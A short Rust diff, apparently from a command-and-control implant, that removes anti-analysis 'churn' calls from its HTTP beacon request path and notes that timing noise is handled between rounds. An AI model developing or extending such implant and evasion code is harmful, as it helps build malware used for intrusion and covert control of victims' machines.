@@ -33,7 +33,8 @@ pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Err
 }
 
 fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
-    crate::helpers::churn(payload.as_bytes());
+    // No BusyWork on the C2 hot path — chunked file/loader transfers issue many
+    // POSTs per task. Interval noise lives in helpers::idle() between rounds.
 
     let encoded = if encode {
         let uuid = config::UUID.read().unwrap();
@@ -74,7 +75,6 @@ fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn 
         e
     })?;
     crate::dlog!("http: status={status} resp_len={}", body.len());
-    crate::helpers::churn(body.as_str());
     Ok(body)
 }
 
